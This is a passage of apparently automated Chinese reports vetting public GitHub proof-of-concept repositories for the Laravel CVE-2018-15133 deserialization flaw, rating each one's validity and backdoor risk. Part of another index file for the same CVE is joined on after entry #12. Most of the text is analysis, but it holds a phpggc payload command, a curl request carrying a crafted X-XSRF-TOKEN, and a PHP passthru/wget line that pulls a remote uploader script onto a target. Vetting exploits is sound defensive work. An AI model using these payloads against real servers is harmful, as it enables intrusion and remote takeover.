4.  **触发反序列化：** Laravel应用在处理请求时，会尝试解密`X-XSRF-TOKEN`，并对其进行反序列化。如果APP_KEY正确，且反序列化链存在，则会导致远程代码执行。

总而言之，该漏洞的利用依赖于APP_KEY的泄露，攻击难度较高，但危害性很大。

**项目地址:** [aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #10

**来源**: [CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md](../2018/CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常不易获取，除非之前已获得权限或成功进行过其他攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中。由于对 X-XSRF-TOKEN 值进行不可信的反序列化调用，可能导致远程代码执行。涉及到 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法和 phpggc 中 gadgetchains/Laravel/RCE/3/chain.php 。攻击者必须知道应用程序密钥（APP_KEY），这通常不会发生，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能会发生。

**利用方式：**

1.  **获取 APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要设法获取 Laravel 应用的 APP_KEY，这可能通过源代码泄露、数据库访问或其他漏洞实现。
2.  **构造恶意 XSRF-TOKEN：** 使用 phpggc 工具生成包含恶意 PHP 对象的序列化字符串。该对象旨在利用 Laravel 框架中的反序列化漏洞执行任意代码。
3.  **加密 Payload：**  使用 APP_KEY 对序列化的 Payload 进行加密，生成有效的 XSRF-TOKEN。代码中的`cve.php`脚本完成了这个步骤，使用APP_KEY对phpggc生成的Payload加密，然后放入Cookie中。
4.  **发送包含恶意 XSRF-TOKEN 的请求：**  将构造的 XSRF-TOKEN 设置为 Cookie，并发送到目标 Laravel 应用。
5.  **触发反序列化：**  当 Laravel 应用尝试解密并反序列化 XSRF-TOKEN 时，恶意对象将被实例化，从而执行攻击者指定的代码。

**POC有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，此POC有效。存在多个公开的漏洞利用代码，CISA也将此漏洞标记为已知被利用漏洞，增加了POC的有效性。

**投毒风险：**

虽然主利用脚本 `cve.php` 看起来是直接利用漏洞，但仍然存在一些潜在的投毒风险：

*   **依赖外部资源：** `cve.php` 依赖于 `phpggc` 工具，如果 `phpggc` 被篡改，可能会引入恶意代码。风险相对较低，因为 `phpggc` 是一个广泛使用的工具，被篡改的可能性较低。但是仍需确认。
*   **shell_exec函数滥用风险：** `cve.php` 中多次使用了 `shell_exec` 函数，包括执行 `phpggc` 命令和 `curl` 命令。如果攻击者可以控制这些命令的参数，就可能执行任意系统命令。由于 `cve.php` 需要用户提供 APP_KEY 和目标 URL，并且有 payload 参数，存在用户误用的情况，比如直接使用了恶意payload。
*   **README.md文件：**此文件是正常的说明文档，没有发现投毒内容。
*   **phpggc:** 本身作为一个payload生成器，其本身不应该作为投毒风险考虑，而是应该考虑其生成payload的安全性。

考虑到以上因素，评估此仓库的投毒风险为 10%。 风险主要集中在用户误用，或者`phpggc`工具被篡改的可能性。

**项目地址:** [bukitbarisan/laravel-rce-cve-2018-15133](https://github.com/bukitbarisan/laravel-rce-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #11

**来源**: [CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md](../2018/CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework Token Unserialize RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常需要之前已经获得的特权访问或成功利用了之前的漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133 漏洞是 Laravel Framework 中由于对 X-XSRF-TOKEN 值进行不安全的反序列化操作导致的远程代码执行漏洞。攻击者可以通过伪造恶意的 X-XSRF-TOKEN，并将其加密后发送给服务器，服务器在解密并反序列化该 token 时，会执行攻击者预先设定的恶意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞的 POC 代码是有效的。搜索引擎结果中包含了多个指向该漏洞的详细描述、利用代码示例以及缓解措施的文章，包括 CISA 将其添加到已知被利用的漏洞目录中。
提供的 Dockerfile 文件和 README.md 文件描述了如何搭建一个存在漏洞的 Laravel 环境并利用 `cve-2018-15133.php` 脚本进行攻击。README.md 中给出了详细的利用步骤，包括获取 APP_KEY，生成反序列化 Payload，加密 Payload，最后通过 POST 请求发送 Payload。脚本通过构造特定的 PHP 对象，在反序列化时触发 `system()` 函数来执行任意命令。

**投毒风险：**
Dockerfile文件用于构建一个包含漏洞版本的Laravel应用的Docker镜像。 cve-2018-15133.php 用于漏洞利用，并没有发现可疑或恶意行为，因此投毒风险较低。

代码仓库中主要为演示漏洞利用的代码，并无发现存在恶意行为或后门的代码。`phpggc` 用于生成payload，但其本身不是由该作者提供的,所以此处不做分析。Dockerfile 安装的是已知漏洞版本的 Laravel，用于复现，而不是植入后门，所以投毒可能性较低。 投毒风险较低，大约在1%以下。

**利用方式：**
1.  **获取 APP_KEY：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。通常，这需要攻击者已经获得了服务器的某些权限，例如读取 `.env` 文件的权限。可以通过`docker exec -it $(docker ps --latest --quiet) grep -e ^APP_KEY /var/www/html/laravel/.env`来获取，这说明需要一定的权限才能获取该KEY，这使得利用难度增大。
2.  **生成反序列化 Payload：** 攻击者使用 `phpggc` 工具（或类似工具）生成一个恶意 PHP 反序列化 Payload。该 Payload 包含一个精心构造的对象链，当被反序列化时，会执行任意命令。 例如，`phpggc Laravel/RCE1 'uname -a' -b`。
3.  **加密 Payload：** 使用 Laravel 的加密机制（`Illuminate\Encryption\Encrypter`）以及 APP_KEY 对 Payload 进行加密，生成一个类似于 Laravel XSRF-TOKEN 的字符串。这通过 cve-2018-15133.php 进行
4.  **发送 Payload：** 将加密后的 Payload 放在 `X-XSRF-TOKEN` HTTP header 中，发送一个 POST 请求到存在漏洞的 Laravel 应用。 例如：`curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI`
5.  **触发 RCE：** Laravel 应用在处理请求时，会解密并反序列化 `X-XSRF-TOKEN` 的值。由于 Payload 是恶意的，反序列化过程会触发远程代码执行，导致服务器执行攻击者预先设定的命令。


**项目地址:** [kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #12

**来源**: [CVE-2018-15133-pwnedshell_Larascript.md](../2018/CVE-2018-15133-pwnedshell_Larascript.md)

# CVE-2018-15133

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-15133-0xSalle_cve-2018-15133.md](../2018/CVE-2018-15133-0xSalle_cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行和服务器被完全控制

**影响版本:** 5.5.40 及之前版本，5.6.x 版本直至 5.6.29

**利用条件:** 需要知道 Laravel 应用的 APP_KEY，通常情况下无法获取，但如果攻击者之前拥有过特权访问权限或成功完成了之前的攻击，则可能获取到。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，攻击者可以通过在 X-XSRF-TOKEN 值上进行未授权的反序列化操作，导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 的 gadgetchains/Laravel/RCE/3/chain.php 中。利用该漏洞需要知道 Laravel 应用的 APP_KEY，并通过精心构造的序列化数据，触发特定的 PHP 对象链（gadget chain）执行任意代码。

**有效性：**
提供的 POC 代码看起来是有效的，因为它实现了以下功能：
1.  生成恶意 payload：根据指定的命令、API 密钥和 payload 方法，生成反序列化 payload。
2.  加密 payload：使用 Laravel 应用的 APP_KEY 对 payload 进行 AES 加密，并生成相应的 IV 和 MAC 值。
3.  发送 payload：将加密后的 payload 设置到 X-XSRF-TOKEN cookie 中，并发送请求到 Laravel 应用。

**投毒风险：**
该代码仓库中存在一定的投毒风险，大约为10%。风险主要体现在以下几个方面：
1.  **潜在的后门代码：** 即使表面上代码实现了漏洞利用的功能，但攻击者可能在代码中隐藏一些恶意的后门，例如：
    *   在生成 payload 的过程中，插入额外的恶意代码。
    *   在请求发送过程中，记录或泄露敏感信息。
    *   利用漏洞在目标服务器上部署持久化后门。
2.  **依赖风险：** 该 POC 代码可能依赖于一些外部库或模块，这些库或模块本身可能存在安全漏洞或恶意代码。
3.  **不完善的错误处理：** 代码中的错误处理可能不够完善，导致程序在特定情况下崩溃或产生其他安全问题。

**利用方式：**
利用方式如下：
1.  **获取 APP_KEY：** 首先需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步，可能需要通过其他漏洞或社会工程学手段获取。
2.  **生成 Payload：** 使用 POC 代码生成包含恶意命令的 payload。POC 允许选择不同的 payload 方法（Laravel RCE1, RCE2, RCE3, RCE4），选择合适的 payload 方法可能取决于目标环境的配置。
3.  **加密 Payload：** 使用 APP_KEY 对生成的 payload 进行加密，并计算 MAC 值。
4.  **发送请求：** 将加密后的 payload 作为 X-XSRF-TOKEN cookie 的值发送到目标 Laravel 应用。
5.  **触发反序列化：** Laravel 应用在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 的值，从而触发漏洞，执行恶意代码。

**项目地址:** [0xSalle/cve-2018-15133](https://github.com/0xSalle/cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #2

**来源**: [CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md](../2018/CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行，完全控制服务器

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，可以通过其他漏洞获取或之前已获得特权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 5.5.40 及之前版本，以及 5.6.x 系列的 5.6.29 及之前版本中。攻击者可以通过在 X-XSRF-TOKEN 中发送恶意序列化数据，利用 `unserialize` 函数执行任意代码。利用链涉及 `Illuminate/Encryption/Encrypter.php` 的 decrypt 方法以及 phpggc 中的 `PendingBroadcast` gadget chain。攻击的先决条件是攻击者需要知道 Laravel 应用的 `APP_KEY`，这通常很难，但可以通过信息泄露漏洞或其他攻击获得。提供的 PoC 代码包含一个 bash 脚本 `betterpoc.sh` 用于自动化利用，以及一个 PHP 脚本 `cve-2018-15133.php` 用于生成恶意 X-XSRF-TOKEN。`betterpoc.sh` 脚本通过调用 `phpggc` 生成反序列化 payload，然后使用 `cve-2018-15133.php` 脚本利用 APP_KEY 加密 payload，最终通过 curl 发送包含恶意 token 的 POST 请求。投毒风险分析：尽管 PoC 代码主要用于漏洞验证，自动化脚本存在轻微风险，例如通过修改命令注入后门，该风险较低，约10%，因需要使用者进行配置，且代码清晰可见。利用方式总结：1. 获取目标 Laravel 应用的 APP_KEY。2. 使用 phpggc 生成执行任意命令的反序列化 payload。3. 使用 cve-2018-15133.php 脚本，利用 APP_KEY 加密 payload 生成 X-XSRF-TOKEN。4. 发送包含恶意 X-XSRF-TOKEN 的 POST 请求到目标服务器。

**项目地址:** [AlienX2001/better-poc-for-CVE-2018-15133](https://github.com/AlienX2001/better-poc-for-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #3

**来源**: [CVE-2018-15133-AzhariKun_CVE-2018-15133.md](../2018/CVE-2018-15133-AzhariKun_CVE-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，并且目标存在未升级的Laravel框架漏洞版本。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞，攻击者通过在X-XSRF-TOKEN中注入恶意序列化数据，并利用`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法进行解密时触发反序列化操作，从而执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码利用了该漏洞，通过上传包含恶意payload的XSRF-TOKEN，理论上是有效的。该代码首先尝试从`.env`文件中获取`APP_KEY`，然后将目标站点和`APP_KEY`发送到 `http://exploit.anons79.com/`，进行后续处理。GitHub上也有公开的利用代码，可以辅助验证漏洞。

**投毒风险：**
POC 代码存在一定的投毒风险。

1.  **依赖外部网站**：POC 代码向 `http://exploit.anons79.com/` 发送数据。如果这个网站被攻陷或者被作者控制，可能被植入恶意代码。所以具有一定的风险。
2.  **未知的恶意行为**：`http://exploit.anons79.com/` 站点的行为是不透明的。虽然POC声称是自动上传shell,但实际实现可能包含未知的恶意行为，例如：收集目标信息，植入更深层次的后门。
3.  **`.env` 文件泄露**:  直接尝试从 `.env` 文件中读取 `APP_KEY` 存在风险，可能导致敏感信息泄露。

综合来看，投毒风险大概在20%左右。

**利用方式：**
1.  **获取APP_KEY：** 攻击者首先需要获取Laravel应用的APP_KEY。这可以通过多种方式实现，例如：
    *   直接读取.env文件（如果配置不当允许访问）。
    *   通过其他漏洞（如文件包含、SQL注入等）获取。
    *   猜测或者暴力破解（难度较高）。
2.  **构造恶意payload：** 攻击者使用phpggc等工具，根据已知的gadget chain构造恶意的序列化payload。
3.  **加密payload：** 使用APP_KEY和Laravel的加密算法对payload进行加密。
4.  **发送请求：** 将加密后的payload作为X-XSRF-TOKEN的值，发送到目标Laravel应用。
5.  **触发反序列化：** 当Laravel应用处理请求时，会解密X-XSRF-TOKEN，从而触发反序列化操作，最终执行payload中的恶意代码，实现远程代码执行。

**项目地址:** [AzhariKun/CVE-2018-15133](https://github.com/AzhariKun/CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #4

**来源**: [CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #5

**来源**: [CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md](../2018/CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中，是由于对 X-XSRF-TOKEN 值进行 unserialize 调用时，可能导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 中。攻击者必须知道应用程序密钥（APP_KEY），通常这是不可能发生的，除非攻击者先前拥有特权访问权限或成功完成了之前的攻击。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步。
2.  攻击者使用 phpggc (或类似工具) 生成一个恶意的 PHP 对象序列化字符串，该字符串利用了 Laravel 框架中的反序列化漏洞链（例如，PendingBroadcast 和相关的 gadget chain）。
3.  该序列化字符串被加密并编码，然后设置为 X-XSRF-TOKEN cookie 的值。
4.  当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN cookie 时，恶意的对象链会被触发，导致远程代码执行。

**POC有效性：**

提供的 POC 代码利用了 CVE-2018-15133 漏洞。代码中包含了生成加密数据，设置 X-XSRF-TOKEN cookie，以及发送请求的代码。给定的命令可以通过反序列化执行。

**投毒风险：**

查看`exploit.go`后，发现代码的主要功能是生成恶意序列化数据，加密数据，以及发送HTTP请求。该`exploit.go`文件代码量较少,功能明确,没有发现明显的恶意代码。
README.md 文档描述了漏洞利用的步骤和所需的环境。其中提到需要下载并运行 Docker 镜像 `kozmico/laravel-poc-cve-2018-15133`。 虽然该 Docker 镜像本身不是本次评估的一部分，但是如果该镜像中包含恶意代码，则可能会导致投毒攻击。该镜像的安全性需要单独评估。此外，该README建议使用 kali linux 虚拟机进行攻击。说明攻击环境搭建比较复杂。总的来说，此仓库存在一定的投毒风险，但主要风险来源于引用的 Docker 镜像，而非提供的Go代码。根据评估，代码本身存在投毒的概率较低，大约在10%。

**项目地址:** [Cr4zyD14m0nd137/Lab-for-cve-2018-15133](https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #6

**来源**: [CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md](../2018/CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md)

## CVE-2018-15133-Laravel框架-反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，通过X-XSRF-TOKEN传递恶意payload。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133漏洞存在于Laravel Framework的5.5.40及之前版本，以及5.6.x到5.6.29版本。该漏洞是由于对X-XSRF-TOKEN值进行unserialize调用时，未对数据进行充分验证，导致远程代码执行。攻击者需要知道APP_KEY才能成功利用此漏洞。这个APP_KEY通常不会被泄露，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能发生。

**漏洞利用方式：**

1.  攻击者获取Laravel应用的APP_KEY（例如，通过源代码泄露、环境变量泄露等）。
2.  攻击者使用phpggc生成包含恶意代码的PHP序列化payload。POC中使用了`Laravel/RCE5` gadget chain，该gadget chain允许执行任意系统命令。
3.  攻击者使用APP_KEY加密该payload，并将其设置为X-XSRF-TOKEN cookie的值。
4.  攻击者向目标Laravel应用发送包含该cookie的HTTP请求。
5.  Laravel应用解密cookie值，然后反序列化payload，执行恶意代码。

**漏洞利用有效性：**

提供的PoC代码是有效的，因为它实现了上述漏洞利用过程。该脚本使用phpggc生成payload，然后使用APP_KEY对其进行加密，并发送包含该加密payload的HTTP请求。

**投毒风险：**

该代码的投毒风险极低。原因如下：

*   代码量较少，逻辑清晰，主要功能是利用已知的反序列化漏洞。
*   代码使用了subprocess调用外部程序phpggc，如果phpggc本身被篡改，则可能引入风险，但该风险不在本代码的范围内。
*   代码中没有发现任何尝试连接外部服务器或执行其他恶意操作的迹象。
*  由于脚本依赖phpggc来生成payload, 因此如果phpggc被替换成了恶意版本,可能会存在被投毒的风险. 但本脚本本身只是对phpggc的调用,不具备投毒的特性. 如果不考虑第三方依赖的风险, 代码投毒风险评估为1%.

**项目地址:** [Loaxert/CVE-2018-15133-PoC](https://github.com/Loaxert/CVE-2018-15133-PoC)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #7

**来源**: [CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md](../2018/CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md)

## CVE-2018-15133-Laravel-反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道 Laravel 应用的 application key

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 是 Laravel 框架中的一个反序列化漏洞，存在于 5.5.40 及之前的版本，以及 5.6.x 系列的 5.6.29 及之前的版本。该漏洞源于对 X-XSRF-TOKEN 值的不可信反序列化调用，攻击者可以通过构造恶意的序列化数据，并将其作为 X-XSRF-TOKEN 的值发送到服务器，从而触发远程代码执行。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 application key。这通常是利用此漏洞最困难的部分。攻击者可能通过先前获取的权限或信息泄露来获得此密钥。
2.  攻击者使用 phpggc 等工具，基于 PendingBroadcast gadget chain 生成恶意的序列化 payload。
3.  攻击者使用 application key 对 payload 进行加密，并生成相应的 X-XSRF-TOKEN 值。
4.  攻击者将构造的 X-XSRF-TOKEN 值添加到 HTTP 请求头中，并发送到目标 Laravel 应用。
5.  服务器在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 值，从而触发 payload 中的恶意代码，最终实现远程代码执行。

**有效性：**

根据漏洞信息、搜索结果和提供的 POC 代码，可以判断该漏洞利用是有效的。搜索结果中提供了多个关于此漏洞的描述和利用的链接，包括 NVD、CISA 的已知被利用漏洞目录以及 GitHub 上的 POC 代码仓库。

提供的 POC 代码 (main.cpp) 看起来是一个 C++ 编写的漏洞利用程序，它实现了以下功能：

*   接受 URL、命令和 application key 作为参数。
*   生成恶意的 X-XSRF-TOKEN 值。
*   发送带有构造的 X-XSRF-TOKEN 值的 HTTP 请求到目标 URL。

该 POC 代码使用了 OpenSSL 库进行 AES 加密和 HMAC 计算，并且使用了 Base64 编码。  代码逻辑与漏洞描述一致，即利用已知的 application key，构造恶意payload，经过加密、编码后，作为 X-XSRF-TOKEN 发送，从而触发反序列化漏洞。

**投毒风险：**

该 POC 代码主要由 `main.cpp` 和 `build.sh` 构成。`build.sh` 负责编译 `main.cpp`。`main.cpp` 代码量相对较大，人工review 存在疏漏的可能。以下是我对投毒风险的分析：

*   **正面因素：** 代码逻辑主要集中在实现漏洞利用上，包括参数解析、payload 生成、加密、编码、HTTP 请求发送等。没有发现明显的恶意代码或后门。
*   **负面因素：**  代码使用了第三方库 OpenSSL，并且包含一些字符串处理和内存管理操作，这些地方可能存在安全漏洞。例如，如果代码没有正确处理字符串长度，可能会导致缓冲区溢出。
*   **潜在风险：** 攻击者可能通过修改 `build.sh` 添加额外的编译选项，例如链接恶意库，从而植入后门。但是，提供的 `build.sh` 文件比较简单，只包含编译命令，没有发现任何可疑操作。

综合来看，该仓库中存在作者隐藏的投毒代码的可能性较低，大概在5%左右。主要风险在于代码中可能存在的潜在安全漏洞，以及编译过程中可能被利用的风险。

**项目地址:** [NatteeSetobol/CVE-2018-15133-Lavel-Expliot](https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #8

**来源**: [CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md](../2018/CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 5.5.x <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，通过 X-XSRF-TOKEN 传递恶意序列化数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 漏洞是 Laravel 框架中由于对 X-XSRF-TOKEN 值的反序列化操作不当导致的远程代码执行漏洞。攻击者可以构造恶意的序列化数据，通过 X-XSRF-TOKEN 头部发送给服务器，服务器在解密和反序列化该数据时，执行攻击者预先设定的恶意代码。漏洞利用的关键在于需要知道 Laravel 应用的 APP_KEY，才能成功加密和构造恶意数据。搜索结果表明该漏洞已被CISA列入已知被利用的漏洞目录。

